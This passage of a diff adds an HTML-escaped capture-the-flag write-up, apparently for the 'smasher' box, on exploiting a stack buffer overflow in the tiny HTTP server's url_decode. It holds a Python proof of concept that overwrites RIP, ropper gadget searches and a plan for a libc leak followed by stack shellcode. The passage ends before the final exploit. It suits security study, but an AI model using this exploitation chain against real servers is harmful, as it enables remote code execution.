+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;memcpy&lt;&#x2F;span&gt;&lt;span&gt;(code, ++p, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;        *dest++ = (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;strtoul&lt;&#x2F;span&gt;&lt;span&gt;(code, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;        p += &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;        *dest++ = *p++;
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;*dest = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Function does take 3 args a pointer to a source location buffer, a destination location buffer, and a max size to read.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;url_decode&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;src&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dest&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;max&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;What&#x27;s the deal with this? Let&#x27;s see. This is how function is called from process_request() function:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;url_decode&lt;&#x2F;span&gt;&lt;span&gt;(filename, req-&amp;gt;filename, MAXLINE);
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;filename = is a pointer to buffer defined here:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt; buf[MAXLINE], method[MAXLINE], uri[MAXLINE];
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So filename is a buffer of MAXLINE size, which is:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;MAXLINE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1024   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;* max length of a line *&#x2F;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;That&#x27;s a first argument, and it&#x27;s a source argument which get&#x27;s copied into second argument. That argument is req-&amp;gt;filename, which is a buffer inside struct named http_request:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;typedef struct &lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt; filename[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;512&lt;&#x2F;span&gt;&lt;span&gt;];
+&lt;&#x2F;span&gt;&lt;span&gt;    off_t offset;              &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;* for support Range *&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;    size_t end;
+&lt;&#x2F;span&gt;&lt;span&gt;} http_request;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And we can clearly see that buffer filename is 512 bytes long.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt; filename[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;512&lt;&#x2F;span&gt;&lt;span&gt;];
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Third argument is number of bytes to copy, which is also set to MAXLINE, 1024 bytes.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span&gt;MAXLINE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1024   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;* max length of a line *&#x2F;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So there&#x27;s our &lt;b&gt;buffer overflow&lt;&#x2F;b&gt;.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;&#x2F;h2&gt;
+&lt;p&gt;Having most of the stuff needed for futher exploitation, let&#x27;s dive into it.
+Buffer overflow occures when url_decoder() tries to &#x27;decode&#x27; filename sent with a GET request. So our payload will be in:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;GET &#x2F;payloadpayloadpayload
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Note: we won&#x27;t count first slash &#x27;&#x2F;&#x27; from GET request in payload length, because it get trimed before processing.
+&lt;img src=&quot;&#x2F;images&#x2F;smasher&#x2F;tiny_process.png&quot; alt=&quot;request get&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;from the picture above we can calculate that our buffer is at:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;0x298 - (0x90 - 0x30) = 0x238
+&lt;&#x2F;span&gt;&lt;span&gt;Converted to decimal 568
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;We can test that with and overwrite RIP with B&#x27;s.
+Our payload is &quot;A&quot; * 568 + 0x424242424242&lt;&#x2F;p&gt;
+&lt;p&gt;Let&#x27;s run tiny binary in gdb and set breakpoint right after url_decode() ret.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root@--name:&#x2F;ctf&#x2F;work#&lt;&#x2F;span&gt;&lt;span&gt; gdb&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -q&lt;&#x2F;span&gt;&lt;span&gt; tiny
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Reading&lt;&#x2F;span&gt;&lt;span&gt; symbols from tiny...done.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pwndbg&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; set follow-fork-mode child
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pwndbg&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; b *0x000000000040178b
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Breakpoint&lt;&#x2F;span&gt;&lt;span&gt; 1 at 0x40178b: file tiny.c, line 268.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pwndbg&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Starting&lt;&#x2F;span&gt;&lt;span&gt; program: &#x2F;ctf&#x2F;work&#x2F;tiny 
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;warning:&lt;&#x2F;span&gt;&lt;span&gt; Error disabling address space randomization: Operation not permitted
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;listen&lt;&#x2F;span&gt;&lt;span&gt; on port 9999, fd is 3
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Run this simple POC:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;root@--name:&#x2F;ctf&#x2F;work&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# cat padding.py 
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;struct
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;socket
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;padding = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;A&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;568
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;RIP &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x424242424242
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;payload = &amp;quot;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;payload += padding
+&lt;&#x2F;span&gt;&lt;span&gt;payload += struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;RIP&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;s = socket.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;socket&lt;&#x2F;span&gt;&lt;span&gt;(socket.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;AF_INET&lt;&#x2F;span&gt;&lt;span&gt;, socket.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SOCK_STREAM&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;s.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;connect&lt;&#x2F;span&gt;&lt;span&gt;((&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;localhost&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;9999&lt;&#x2F;span&gt;&lt;span&gt;))
+&lt;&#x2F;span&gt;&lt;span&gt;s.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;GET &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;{} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;format&lt;&#x2F;span&gt;&lt;span&gt;(payload))
+&lt;&#x2F;span&gt;&lt;span&gt;s.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;As soon as we hit a break point:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt; ► f 0           40178b url_decode+107
+&lt;&#x2F;span&gt;&lt;span&gt;   f 1           4018af parse_request+287
+&lt;&#x2F;span&gt;&lt;span&gt;   f 2           401e23 process.part+67
+&lt;&#x2F;span&gt;&lt;span&gt;   f 3     424242424242
+&lt;&#x2F;span&gt;&lt;span&gt;   f 4           400fa0 _start
+&lt;&#x2F;span&gt;&lt;span&gt;   f 5       10fd963730
+&lt;&#x2F;span&gt;&lt;span&gt;   f 6  100007f1ccf0002
+&lt;&#x2F;span&gt;&lt;span&gt;   f 7                0
+&lt;&#x2F;span&gt;&lt;span&gt;Breakpoint *0x000000000040178b
+&lt;&#x2F;span&gt;&lt;span&gt;pwndbg&amp;gt; c
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;We can se our 424242424242 on the stack, and continue:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;Program received signal SIGSEGV (fault address 0x424242424242)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And as expected:
+&lt;img src=&quot;&#x2F;images&#x2F;smasher&#x2F;tiny_padding.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We have overwritten RIP with our 0x424242424242 bytes.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;b&gt;Plan&lt;&#x2F;b&gt; is:&lt;br &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;Find gadget for pop rdi; pop rsi; ret. &lt;br &#x2F;&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;Return to write@plt to leak read@got address so we can use that address from GOT to calculate base address of libc ( Remmber ASLR is ON).&lt;br &#x2F;&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;Find gadget to push RSP so we can execute out shellcode from stack. We don&#x27;t need to overwrite system entry on GOT and return to that because NX is off.&lt;br &#x2F;&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;Send another payload containing out shellcode, push RSP and check if it gets exeuted&lt;br &#x2F;&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;To find gadgets, i&#x27;ve used ropper ( &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;sashs&#x2F;Ropper&quot;&gt;Ropper @ github&lt;&#x2F;a&gt; ), you can use whatever you want.
+Lets&#x27;s find out which gadgets can we find inside tiny binary.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root@--name:&#x2F;ctf&#x2F;work#&lt;&#x2F;span&gt;&lt;span&gt; ropper&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --file&lt;&#x2F;span&gt;&lt;span&gt; tiny&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --search &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;% ?di; ret&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[INFO]&lt;&#x2F;span&gt;&lt;span&gt; Load gadgets from cache
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[LOAD]&lt;&#x2F;span&gt;&lt;span&gt; loading... 100%
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[LOAD]&lt;&#x2F;span&gt;&lt;span&gt; removing double gadgets... 100%
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[INFO]&lt;&#x2F;span&gt;&lt;span&gt; Searching for gadgets: % ?di; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ret
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[INFO]&lt;&#x2F;span&gt;&lt;span&gt; File: tiny
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00000000004011dd:&lt;&#x2F;span&gt;&lt;span&gt; pop rdi; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ret&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;In tiny i found only pop RDI; ret. And we need pop RDI; pop RSI; ret. So we have to chain them.&lt;br &#x2F;&gt;
+Next on the list is pop RSI, and i find one which pops RSI, then pop R15 and returns. That&#x27;s good enough, since we are gona put some trash in R15 because we don&#x27;t need it.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root@--name:&#x2F;ctf&#x2F;work#&lt;&#x2F;span&gt;&lt;span&gt; ropper&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --file&lt;&#x2F;span&gt;&lt;span&gt; tiny&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --search &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;pop ?si&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[INFO]&lt;&#x2F;span&gt;&lt;span&gt; Load gadgets from cache
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[LOAD]&lt;&#x2F;span&gt;&lt;span&gt; loading... 100%
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[LOAD]&lt;&#x2F;span&gt;&lt;span&gt; removing double gadgets... 100%
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[INFO]&lt;&#x2F;span&gt;&lt;span&gt; Searching for gadgets: pop ?si
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[INFO]&lt;&#x2F;span&gt;&lt;span&gt; File: tiny
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;.....
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00000000004011db:&lt;&#x2F;span&gt;&lt;span&gt; pop rsi; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pop&lt;&#x2F;span&gt;&lt;span&gt; r15; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ret&lt;&#x2F;span&gt;&lt;span&gt;; 
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Last one, push RSP, which we need for last stage of exploit, we are going to look for inside libc.so.6 which is downloaded from the server, because i couln&#x27;t find one in tiny binary. &lt;br &#x2F;&gt;
+&lt;b&gt;Note&lt;&#x2F;b&gt;: we will find offset to it, which needs to be added to libc base address later.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root@--name:&#x2F;ctf&#x2F;work#&lt;&#x2F;span&gt;&lt;span&gt; ropper&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --file&lt;&#x2F;span&gt;&lt;span&gt; libc.so.6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --search &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;push rsp&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[INFO]&lt;&#x2F;span&gt;&lt;span&gt; Load gadgets from cache
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[LOAD]&lt;&#x2F;span&gt;&lt;span&gt; loading... 100%
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[LOAD]&lt;&#x2F;span&gt;&lt;span&gt; removing double gadgets... 42%
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[LOAD]&lt;&#x2F;span&gt;&lt;span&gt; removing double gadgets... 100%
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[INFO]&lt;&#x2F;span&gt;&lt;span&gt; Searching for gadgets: push rsp
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[INFO]&lt;&#x2F;span&gt;&lt;span&gt; File: libc.so.6
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;......
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000023ad1:&lt;&#x2F;span&gt;&lt;span&gt; push rsp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ret&lt;&#x2F;span&gt;&lt;span&gt;; 
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;......
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So we have all of them:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# gadgets
+&lt;&#x2F;span&gt;&lt;span&gt;poprdiret = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x4011dd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# pop rdi; ret
+&lt;&#x2F;span&gt;&lt;span&gt;poprsiret = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x4011db &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# pop rsi; pop r15; ret
+&lt;&#x2F;span&gt;&lt;span&gt;push_rsp  = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x023ad1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# push rsp; ret
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Next, let&#x27;s find read@got and read offset in libc address and write @plt address.&lt;&#x2F;p&gt;
+&lt;p&gt;We can see address of write@plt if we disassemble process function. There&#x27;s a call to it:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;smasher&#x2F;tiny_write_plt.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;  0x00000000004010e9 &amp;lt;+41&amp;gt;:	call   0x400c50 &amp;lt;write@plt&amp;gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;That&#x27;s done, now on to read@GOT.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root@--name:&#x2F;ctf&#x2F;work#&lt;&#x2F;span&gt;&lt;span&gt; objdump&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -R&lt;&#x2F;span&gt;&lt;span&gt; tiny | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;grep&lt;&#x2F;span&gt;&lt;span&gt; read
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0000000000603088&lt;&#x2F;span&gt;&lt;span&gt; R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And lastly we need read() offset from libc.&lt;&#x2F;p&gt;
